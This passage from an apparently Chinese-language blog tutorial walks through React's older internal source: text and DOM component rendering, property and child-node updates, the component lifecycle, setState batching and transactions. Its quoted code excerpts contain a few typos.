DOMLazyTree(openingComment));</span><br><span class="line">      <span class="comment">// 如果是文本类型，则创建文本节点</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>._stringText) &#123;</span><br><span class="line">        DOMLazyTree.queueChild(lazyTree, DOMLazyTree(ownerDocument.createTextNode(<span class="keyword">this</span>._stringText)));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 结束标签</span></span><br><span class="line">      DOMLazyTree.queueChild(lazyTree, DOMLazyTree(closingComment));</span><br><span class="line">      ReactDOMComponentTree.precacheNode(<span class="keyword">this</span>, openingComment);</span><br><span class="line">      <span class="keyword">this</span>._closingComment = closingComment;</span><br><span class="line">      <span class="keyword">return</span> lazyTree;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> escapedText = escapeTextContentForBrowser(<span class="keyword">this</span>._stringText);</span><br><span class="line">      <span class="comment">// 静态页面下直接返回文本</span></span><br><span class="line">      <span class="keyword">if</span> (transaction.renderToStaticMarkup) &#123;</span><br><span class="line">        <span class="keyword">return</span> escapedText;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 如果不是通过createElement创建的文本，则将标签和属性注释掉，直接返回文本内容。</span></span><br><span class="line">      <span class="keyword">return</span> (</span><br><span class="line">        <span class="string">'!&lt;--'</span> + openingValue + <span class="string">'--&gt;'</span> + escapedText + <span class="string">'&lt;!--'</span> + closingValue + <span class="string">'--&gt;'</span></span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 更新文本内容</span></span><br><span class="line">  receiveComponent: <span class="function"><span class="keyword">function</span>(<span class="params">nextComponent, transaction</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nextText !== <span class="keyword">this</span>._currentElement) &#123;</span><br><span class="line">      <span class="keyword">this</span>._currentElement = nextText;</span><br><span class="line">      <span class="keyword">var</span> nextStringText = <span class="string">''</span> + nextText;</span><br><span class="line">      <span class="keyword">if</span> (nextStringText !== <span class="keyword">this</span>._stringText) &#123;</span><br><span class="line">        <span class="keyword">this</span>._stringText = nextStringText;</span><br><span class="line">        <span class="keyword">var</span> componentNodes = <span class="keyword">this</span>.getNativeNode();</span><br><span class="line"></span><br><span class="line">        DOMChildrenOerations.replaceDelimitedText(commentNodes[<span class="number">0</span>], commentNodes[<span class="number">1</span>], nextStringText)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<h2 id="DOM-标签组件"><a href="#DOM-标签组件" class="headerlink" title="DOM 标签组件"></a>DOM 标签组件</h2><p>ReactDOMComponent 针对 Vitual DOM 标签的处理主要分为以下两个部分：</p>
<ol>
<li>属性的更新，包括更新样式、更新属性、处理事件等；</li>
<li>子节点的更新，包括更新内容、更新子节点，此部分涉及 diff 算法</li>
</ol>
<h2 id="更新属性"><a href="#更新属性" class="headerlink" title="更新属性"></a>更新属性</h2><p>当执行 mountComponent 方法时，ReactDOMComponent 首先会生成标记和标签，通过 this.createOpenTagMarkupAndPutListeners(transaction)来处理 DOM 节点的属性和事件。</p>
<ol>
<li>如果存在事件，则对当前的节点添加事件代理，即调用 enqueuePutListener(this, propKey, propValue, transaction)</li>
<li>如果存在样式，首先会对样式进行合并操作 Object.assign({}, props.style),然后通过 CSSPropertyOperations.createMarkupForStyles(propValue, this)创建样式。</li>
<li>通过DOMPropertyOperations.createMarkupForProperty(propKey, propValue)创建属性。</li>
<li>通过 DOMPropertyOperations.createMarkupForID(this._domID)创建唯一标识</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_createOpenTagMarkupAndPutListeners: <span class="function"><span class="keyword">function</span>(<span class="params">transaction, props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> ret = <span class="string">'&lt;'</span> + <span class="keyword">this</span>._currentElement.type;</span><br><span class="line">  <span class="comment">// 拼凑出属性</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> propKey <span class="keyword">in</span> props) &#123;</span><br><span class="line">    <span class="keyword">var</span> propValue = props[propKey]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (registrationNameModules.hasOwnProperty(propKey)) &#123;</span><br><span class="line">      <span class="comment">// 针对当前的节点添加事件代理</span></span><br><span class="line">      <span class="keyword">if</span> (propValue) &#123;</span><br><span class="line">        enqueuePutListener(<span class="keyword">this</span>, propKey, propValue, transaction)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (propKey === STYLE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (propValue) &#123;</span><br><span class="line">          <span class="comment">// 合并样式</span></span><br><span class="line">          propValue = <span class="keyword">this</span>._previousStyleCopy = <span class="built_in">Object</span>.assign(&#123;&#125;, props.style)</span><br><span class="line">        &#125;</span><br><span class="line">        propValue = CSSPropertyOperations.createMarkupForStyles(propValue, <span class="keyword">this</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 创建属性标识</span></span><br><span class="line">      <span class="keyword">var</span> markup = <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>._tag != <span class="literal">null</span> &amp;&amp; isCustomComponent(<span class="keyword">this</span>._tag, props)) &#123;</span><br><span class="line">        markup = DOMPropertyOperations.createMarkupForProperty(propKey, propValue)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (markup) &#123;</span><br><span class="line">        ret += <span class="string">' '</span> + markup</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对于静态页面，不需要设置react-id，这样可以节省大量字符</span></span><br><span class="line">  <span class="keyword">if</span> (transaction.renderToStaticMarkup) &#123;</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置react-id</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>._nativeParent) &#123;</span><br><span class="line">    ret += <span class="string">' '</span> + DOMPropertyOperations.createMarkupForRoot();</span><br><span class="line">  &#125;</span><br><span class="line">  ret += <span class="string">' '</span> + DOMPropertyOperations.createMarkupForID(<span class="keyword">this</span>._domID)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当执行 receiveComponent 方法时，ReactDOMComponent 会通过 this.updateComponent(transaction, prevElement, nextElement, context)来更新 DOM 节点属性。</p>
<p>先是删除不需要的旧属性。如果不需要旧样式，则遍历旧样式集合，并对每个样式进行置空删除；如果不需要事件，则将其事件监听的属性去掉，即针对当前的节点取消事件代理 deleteListener(this, propKey);如果旧属性不在新属性集合里时，则需要删除旧属性 DOMPropertyOperations.deleteValueForProperty(getNode(this), propKey)。</p>
<p>再是更新新属性。如果存在新样式，则将新样式进行合并 Object.assign({}, nextProp);如果在旧样式中但不在新样式中，则清除该样式；如果既在旧样式中也在新样式中，且不相同，则更新样式 styleUpdates[styleName] = nextProp[styleName];如果在新样式中，但不在旧样式中，则直接更新为新样式 styleUpdates = nextProp;如果存在事件更新，则添加事件监听的属性 enqueuePutListener(this, propKey, nextProp, transaction);如果存在新属性，则添加新属性，或者更新旧的同名属性 DOMPropertyOperations.setValueForAttribute(node, propkey, nextProp).</p>
<p>至此，ReactDOMComponent完成了DOM节点属性更新的操作，相关代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_updateDOMProperties: <span class="function"><span class="keyword">function</span>(<span class="params">lastProps, nextProps, transaction</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> propKey;</span><br><span class="line">  <span class="keyword">var</span> styleName;</span><br><span class="line">  <span class="keyword">var</span> styleUpdates;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当一个旧属性不在新的属性集合里时，需要删除</span></span><br><span class="line">  <span class="keyword">for</span> (propKey <span class="keyword">in</span> lastProps) &#123;</span><br><span class="line">    <span class="comment">// 如果新属性里有，或者propKey是在原型上的则直接跳过，这样剩下的都是不在新属性集合里的。</span></span><br><span class="line">    <span class="keyword">if</span> (nextProps.hasOwnProperty(propKey) || !lastProps.hasOwnProperty(propKey) || lastProps[propKey] == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从DOM上删除不需要的样式</span></span><br><span class="line">    <span class="keyword">if</span> (propKey === STYLE) &#123;</span><br><span class="line">      <span class="keyword">var</span> lastStyle = <span class="keyword">this</span>._previousStyleCopy;</span><br><span class="line">      <span class="keyword">for</span> (styleName <span class="keyword">in</span> lastStyle) &#123;</span><br><span class="line">        <span class="keyword">if</span> (lastStyle.hasOwnProperty(styleName)) &#123;</span><br><span class="line">          styleUpdates = styleUpdates || &#123;&#125;;</span><br><span class="line">          styleUpdates[styleName] = <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">this</span>._previousStyleCopy = <span class="literal">null</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (registrationNameModules.hasOwnProperty(propKey)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (lastProps[propKey]) &#123;</span><br><span class="line">        <span class="comment">// 这里的事件监听的属性需要去掉监听，针对当前的节点取消事件代理</span></span><br><span class="line">        deleteListener(<span class="keyword">this</span>, propKey)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (DOMProperty.isStandardName[propKey] || DOMProperty.isCustomAttribute(propKey)) &#123;</span><br><span class="line">      <span class="comment">// 从DOM上删除不需要的属性</span></span><br><span class="line">      DOMPropertyOperations.deleteValueForProperty(getNode(<span class="keyword">this</span>), propKey)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对于新的属性，需要写到DOM节点上</span></span><br><span class="line">  <span class="keyword">for</span> (propKey <span class="keyword">in</span> nextProps) &#123;</span><br><span class="line">    <span class="keyword">var</span> nextProp = nextProps[propKey];</span><br><span class="line">    <span class="keyword">var</span> lastProp = propKey === STYLE ? <span class="keyword">this</span>._previousStyleCopy : lastProps != <span class="literal">null</span> ? lastProps[propKey] : <span class="literal">undefined</span>;</span><br><span class="line">    <span class="comment">// 不在新属性中，或与旧属性相同，则跳过</span></span><br><span class="line">    <span class="keyword">if</span> (!nextProps.hasOwnProperty(propKey) || nextProp === lastProp || nextProp === <span class="literal">null</span> &amp;&amp; lastProp == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在DOM上写入新样式（更新样式）</span></span><br><span class="line">    <span class="keyword">if</span> (propKey === STYLE) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nextProp) &#123;</span><br><span class="line">        nextProp = <span class="keyword">this</span>._previousStyleCopy = <span class="built_in">Object</span>.assign(&#123;&#125;, nextProp)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (lastProp) &#123;</span><br><span class="line">        <span class="comment">// 在旧样式中且不在新样式中，清除该样式</span></span><br><span class="line">        <span class="keyword">for</span> (styleName <span class="keyword">in</span> lastProp) &#123;</span><br><span class="line">          <span class="keyword">if</span> (lastProp.hasOwnProperty(styleName) &amp;&amp; (!nextProp || !nextProp.hasOwnProperty(styleName))) &#123;</span><br><span class="line">            styleUpdates = styleUpdates || &#123;&#125;</span><br><span class="line">            styleUpdates[styleName] = <span class="string">''</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 即在旧样式中也在新样式中，且不相同，更新该样式</span></span><br><span class="line">        <span class="keyword">for</span> (styleName <span class="keyword">in</span> nextProp) &#123;</span><br><span class="line">          <span class="keyword">if</span> (nextProp.hasOwnProperty(styleName) &amp;&amp; lastProp[styleName] !== nextProp[styleName]) &#123;</span><br><span class="line">            styleUpdates = styleUpdates || &#123;&#125;</span><br><span class="line">            styleUpdates[styleName] = nextProp[styleName]</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 不存在旧样式，直接写入新样式</span></span><br><span class="line">        styleUpdates = nextProp</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (registrationNameModules.hasOwnProperty(propKey)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nextProp) &#123;</span><br><span class="line">        <span class="comment">// 添加事件监听的属性</span></span><br><span class="line">        enqueuePutListener(<span class="keyword">this</span>, propKey, nextProp, transaction)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        deleteListener(<span class="keyword">this</span>, propKey)</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">// 添加新的属性，或者是更新旧的同名属性</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isCustomComponent(<span class="keyword">this</span>._tag, nextProps)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!RESERVED_PROPS.hasOwnProperty(propKey)) &#123;</span><br><span class="line">        <span class="comment">// setValueForAttribute 更新属性</span></span><br><span class="line">        DOMPropertyOperations.setValueForAttribute(getNode(<span class="keyword">this</span>), propKey, nextProp)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (DOMProperty.properties[propKey] || DOMProperty.isCustomAttribute(propKey)) &#123;</span><br><span class="line">      <span class="keyword">var</span> node = getNode(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">if</span> (nextProp != <span class="literal">null</span>) &#123;</span><br><span class="line">        DOMPropertyOperations.setValueForProperty(node, propKey, nextProp)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果更新为null或undefined，则执行删除属性操作</span></span><br><span class="line">        DOMPropertyOperations.deleteValueForProperty(node, propKey)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果styleUpdates不为空，则设置新样式</span></span><br><span class="line">    <span class="keyword">if</span> (styleUpdates) &#123;</span><br><span class="line">      CSSPropertyOperations.setValueForStyles(getNode(<span class="keyword">this</span>), styleUpdates, <span class="keyword">this</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="更新子节点"><a href="#更新子节点" class="headerlink" title="更新子节点"></a>更新子节点</h2><p>当执行mountComponent方法时，ReactDOMComponent会通过this._createContentMarkup(transaction, props, context)来处理DOM节点的内容。</p>
<p>首先，获取节点内容props.dangerouslySetInnerHTML。如果存在子节点，则通过this.mountChildren(childrenToUse, transaction, context)对子节点进行初始化渲染：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_createContentMarkup: <span class="function"><span class="keyword">function</span>(<span class="params">transaction, props, context</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> ret = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取子节点渲染出的内容</span></span><br><span class="line">  <span class="keyword">var</span> innerHTML = props.dangerouslySetInnerHTML;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (innerHTML != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (innerHTML.__html != <span class="literal">null</span>) &#123;</span><br><span class="line">      ret = innerHTML.__html;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> contentToUse = CONTENT_TYPES[<span class="keyword">typeof</span> props.children] ? props.children : <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> childrenToUse = contentToUse != <span class="literal">null</span> ? <span class="literal">null</span> : props.children;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (childrenToUse != <span class="literal">null</span>) &#123;</span><br><span class="line">      ret = escapeTextContentForBrowser(contentToUse)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (childrenToUse != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 对子节点进行初始化渲染</span></span><br><span class="line">      <span class="keyword">var</span> mountImages = <span class="keyword">this</span>.mountChildren(childrenToUse, transaction, context)</span><br><span class="line"></span><br><span class="line">      ret = mountImages.join(<span class="string">''</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 是否需要换行</span></span><br><span class="line">  <span class="keyword">if</span> (newlineEatingTags[<span class="keyword">this</span>._tag] &amp;&amp; ret.charAt(<span class="number">0</span>) === <span class="string">'\n'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'\n'</span> + ret;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当执行 receiveComponent 方法时，ReactDOMComponent 会通过 this._updateDOMChildren(lastProps, nextProps, transaction, context)来更新 DOM 内容和子节点。</p>
<p>先是删除不需要的子节点和内容。如果旧节点存在，而新节点不存在，说明当前节点在更新后被删除，此时执行 this.updateChildren(null, transaction, context);如果旧的内容存在，而新的内容不存在，说明当前内容在更新后被删除，此时执行方法 this.updateTextContent(‘’)。</p>
<p>再是更新子节点和内容。如果新子节点存在，则更新其子节点，此时执行方法 this.updateChildren(nextChildren, transaction, context);如果新内容存在，更新内容，执行 this.updateTextContent(‘’ + nextContent)</p>
<p>至此，ReactDOMComponent完成了DOM子节点和内容的更新操作</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_updateDOMChildren: <span class="function"><span class="keyword">function</span>(<span class="params">lastProps, nextProps, transaction, context</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> lastContent = CONTENT_TYPES[<span class="keyword">typeof</span> lastProps.children] ? lastProps.children : <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">var</span> nextContent = CONTENT_TYPES[<span class="keyword">typeof</span> nextProps.children] ? nextProps.children : <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">var</span> lastHtml = lastProps.dangerouslySetInnerHTML &amp;&amp; lastProps.dangerouslySetInnerHTML._html;</span><br><span class="line">  <span class="keyword">var</span> nextHtml = nextProps.dangerouslySetInnerHTML &amp;&amp; nextProps.dangerouslySetInnerHTML._html;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> lastChildren = lastContent != <span class="literal">null</span> ? nu</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当卸载组件时，ReactDOMComponent 会卸载子节点、清除事件监听、情空标识等。</p>
<h2 id="自定义组件"><a href="#自定义组件" class="headerlink" title="自定义组件"></a>自定义组件</h2><p>ReactCompositeComponent 自定义组件实现了一整套 React 生命周期和 setState 机制，因此自定义组件是在生命周期的环境中进行更新属性、内容和子节点的操作。这些更新操作与 ReactDOMComponent 的操作类似，在此不再赘述。</p>
<h2 id="初探-React-生命周期"><a href="#初探-React-生命周期" class="headerlink" title="初探 React 生命周期"></a>初探 React 生命周期</h2><ol>
<li>当首次挂载组件时，按顺序执行 getDefaultProps、getInitialState、componentWillMount、render 和 componentDidMount</li>
<li>当卸载组件时，执行 componentWillUnmount</li>
<li>当重新挂载组件时，此时按顺序执行 getInitialState、componentWillMount、render 和 componentDidMount，不执行 getDefaultProps</li>
<li>当再次渲染组件时，组件接受到更新状态，此时按顺序执行 componentWillReceiveProps、shouldComponentUpdate、componentWillUpdate、render 和 componentDidUpdate</li>
</ol>
<p>在 ES6 语法中，static defaultProps = {} 就是调用的内部 getDefaultProps，constructor 中的 this.state = {}就是调用内部的 getInitialState。</p>
<h2 id="详解-React-生命周期"><a href="#详解-React-生命周期" class="headerlink" title="详解 React 生命周期"></a>详解 React 生命周期</h2><p>自定义组件（ReactCompositeComponent）的生命周期主要通过 3 个阶段进行管理——MOUNTING、RECEIVE_PROPS 和 UNMOUNTING。这个 3 个阶段对应 3 种方法，分别为：mountComponent、updateComponent、unmountComponent,每个方法都提供了几种处理方法，其中带 will 前缀的方法在进入状态之前调用，带 did 前缀的方法在进入状态之后调用。3 个阶段共包括 5 种处理方法，还有两种特殊状态的处理方法。</p>
<h2 id="1-使用-createClass-创建自定义组件"><a href="#1-使用-createClass-创建自定义组件" class="headerlink" title="1.使用 createClass 创建自定义组件"></a>1.使用 createClass 创建自定义组件</h2><p>createClass 是创建自定义组件的入口方法，负责管理生命周期的 getDefaultProps。该方法在整个生命周期中只执行一次，这样所有实例初始化的 props 将会被共享。<br>通过 createClass 创建自定义组件，利用原型继承 ReactClassComponent 父类，按顺序合并 mixin，设置初始化 defaultProps,返回构造函数。<br>class MyComponent extends React.Component 其实就是调用内部方法 createClass 创建组件。</p>
<h2 id="2-阶段一：MOUNTING"><a href="#2-阶段一：MOUNTING" class="headerlink" title="2.阶段一：MOUNTING"></a>2.阶段一：MOUNTING</h2><p>mountComponent 负责管理生命周期中的 getInitialState、componentWillMount、render 和 componentDidMount。<br>由于 getDefaultProps 是通过构造函数进行管理的，所以在整个生命周期中最先开始执行，也解释了为什么它只执行一次。<br>由于通过 ReactCompositeComponentBase 返回的是一个虚拟节点，所以需要利用 instantiateReactComponent 去得到实例，再使用 mountComponent 拿到结果作为当前自定义元素的结果。</p>
<p>通过 mountComponent 挂载组件，初始化序号、标记等参数，判断是否为无状态组件，并进行对应组件初始化工作，比如初始化 props、context 等参数。利用 getInitialState 获取初始化 state、初始化更新队列和更新状态。</p>
<p>若存在 componentWillMount，则执行。如果此时在 componentWillMount 中调用 setState 方法，是不是触发 re-render 的，而是会进行 state 合并，且 inst.state = this._processPendingState(inst.props, inst.context)是在 componentWillMount 之后执行的，因此 componentWillMount 中的 this.state 并不是最新的，在 render 中才可以获取更新后的 this.state。</p>
<p>因此，React 是利用更新队列 this._pendingStateQueue 以及更新状态 this._pendingReplaceState 和 this._pendingForceUpdate 来实现 setState 的异步更新机制。</p>
<p>当渲染完成后，若存在 ComponentDidMount,则调用。这就解释了 componentWillMount、render、componentDidMountzz 这三者之间的执行顺序。</p>
<p>其实，mountComponent 本质上是通过递归渲染内容的，由于递归的特性，父组件的 componentWillMount 在其子组件的 componentWillMount 之前调用，而 componentDidMount 在子组件的 componentDidMount 之后调用。</p>
<h2 id="3-阶段二：RECEIVE-PROPS"><a href="#3-阶段二：RECEIVE-PROPS" class="headerlink" title="3.阶段二：RECEIVE_PROPS"></a>3.阶段二：RECEIVE_PROPS</h2><p>updateComponent 负责管理生命周期中的 componentWillReceiveProps、shouldComponentUpdate、componentWillUpdate、render 和 componentDidUpdate。</p>
<p>首先通过 updateComponent 更新组件，如果前后元素不一致，说明需要进行组件更新。</p>
<p>若存在 componentWillReceiveProps,则执行。如果此时在 componentWillReceiveProps 中调用 setState,是不会触发 re-render 的，而是会进行 state 合并。且在 componentWillReceiveProps、shouldComponentUpdate 和 componentWillUpdate 中也还是无法获取到更新后的 this.state,即此时访问的 this.state 仍然是未更新的数据，需要设置 inst.state = nextState 后才可以，因此只有在 render 和 componentDidUpdate 中才能获取到更新后的 this.state。</p>
<p>调用 shouldComponentUpdate 判断是否需要进行组件更新，如果存在 componentWillUpdate 则执行。</p>
<p>updateComponent 本质上也是通过递归渲染内容的，由于递归的特性，父组件的 componentWillUpdate 是其子组件的 componentWillUpdate 之前调用的，componentDidUpdate 在之后调用。</p>
<p>当渲染完成后，若存在 componentDidUpdate，则触发。</p>
<p>禁止在 shouldComponentUpdate 和 componentWillUpdate 中调用 setState，这会造成循环调用，直至耗光浏览器内存后崩溃。</p>
<h2 id="4-阶段三：UNMOUNTING"><a href="#4-阶段三：UNMOUNTING" class="headerlink" title="4.阶段三：UNMOUNTING"></a>4.阶段三：UNMOUNTING</h2><p>unmountComponnet 负责管理生命周期中的 componentWillUnmount。</p>
<p>如果存在 componentWillUnmount,则执行并重置所有相关参数、更新队列以及更新状态，如果此时在 componentWillUnmount 中调用 setState，是不会触发 re-render 的，这是因为所有更新队列和更新状态都被重置为 null，并清除了公共类，完成了组件卸载操作。</p>
<h2 id="无状态组件"><a href="#无状态组件" class="headerlink" title="无状态组件"></a>无状态组件</h2><p>无状态组件只是一个 render 方法，并没有组件类的实例化过程，也没有实例返回。</p>
<p>无状态组件没有状态，没有生命周期，只是简单接受 props 渲染生成 DOM 结构，是一个纯粹为渲染而生的组件。</p>
<h2 id="setState-异步更新"><a href="#setState-异步更新" class="headerlink" title="setState 异步更新"></a>setState 异步更新</h2><p>setState 通过一个队列机制实现 state 更新。当执行 setState 时，会将需要更新的 state 合并后放入状态队列，而不会立刻更新 this.state，队列机制可以高效地批量更新 state。如果不通过 setState 而直接修改 this.state 的值，那么该 state 将不会被放入状态队列中，当下次调用 setState 并对状态队列进行合并时，将会忽略之前直接被修改的 state。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将新的state合并到状态更新队列中</span></span><br><span class="line"><span class="keyword">var</span> nextState = <span class="keyword">this</span>._processPendingState(nextProps, nextContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据更新队列和shouldComponentUpdate的状态来判断是否需要更新组件</span></span><br><span class="line"><span class="keyword">var</span> shouldUpdate =</span><br><span class="line">  <span class="keyword">this</span>._pendingForceUpate ||</span><br><span class="line">  !inst.shouldComponentUpdate ||</span><br><span class="line">  inst.shouldComponentUpdate(nextProps, nextState, nextContext);</span><br></pre></td></tr></table></figure>
<h2 id="setState-循环调用风险"><a href="#setState-循环调用风险" class="headerlink" title="setState 循环调用风险"></a>setState 循环调用风险</h2><p>当调用 setState 时，实际上会执行 enqueueSetState 方法，并对 partialState 以及_pendingStateQueue 更新队列进行合并操作，最终通过 enqueueUpdate 执行 state 更新。</p>
<p>而 performUpdateIfNecessary 方法会获取_pendingElement、_pendingStateQueue、_pendingForeUpdate,并调用 receiveComponent 和 updateComponent 方法进行组件更新。</p>
<p>如果在 shouldComponentUpdate 或 componentWillUpdate 方法中调用 setState，此时 this._pendingStateQueue != null,则 performUpdateIfNecessary 方法就会调用 updateComponent 方法进行组件更新，但 updateComponent 方法又会调用 shouldComponentUpdate 和 componentWillUpdate 方法，因此造成循环调用。</p>
<h2 id="setState-调用栈"><a href="#setState-调用栈" class="headerlink" title="setState 调用栈"></a>setState 调用栈</h2><p>setState 最终是通过 enqueueUpdate 执行 state 更新的，那么 enqueueUpdate 到底是如何更新 state 的呢？<br>代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enqueueUpdate</span>(<span class="params">component</span>) </span>&#123;</span><br><span class="line">  ensureInjected();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果不处于批量更新模式</span></span><br><span class="line">  <span class="keyword">if</span> (!batchingStrategy.isBatchingUpdates) &#123;</span><br><span class="line">    batchingStrategy.batchedUpdates(enqueueUpdate, component);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果处于批量更新模式，则将该组件保存在dirtyComponents中</span></span><br><span class="line">  dirtyComponents.push(component);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>batchingStrategy 其实只是一个简单对象</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ReactDefaultBatchingStrategy = &#123;</span><br><span class="line">  isBatchingUpdates: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">  batchedUpdates: <span class="function"><span class="keyword">function</span>(<span class="params">callback, a, b, c, d, e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> alreadyBatchingUpdates = ReactDefaultBatchingStrategy.isBatchingUpdates;</span><br><span class="line">    ReactDefaultBatchingStrategy.isBatchingUpdates = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (alreadyBatchingUpdates) &#123;</span><br><span class="line">      callback(a, b, c, d, e);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      transaction.perform(callback, <span class="literal">null</span>, a, b, c, d, e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="初识事务"><a href="#初识事务" class="headerlink" title="初识事务"></a>初识事务</h2><p>事务就是将需要执行的方法使用 wrapper 封装起来，再通过事务提供的 perform 方法执行。而在 perform 之前，先执行所有 wrapper 中的 initialize 方法，执行完 perform 之后（即执行 method 方法吧之后）再执行所有的 close 方法。一组 initialize 及 close 方法称为一个 wrapper，事务支持多个 wrapper 叠加。</p>
<p>到实现上，事务提供了一个 mixin 方法供其他模块实现自己需要的事务。而要使用事务的模块，除了需要把 mixin 混入自己的事务实现中，还要额外实现一个抽象的 getTransactionWrappers 接口。这个接口用来获取所有需要封装的前置方法（initialize）和收尾方法（close）,因此它需要返回一个数组的对象.</p>
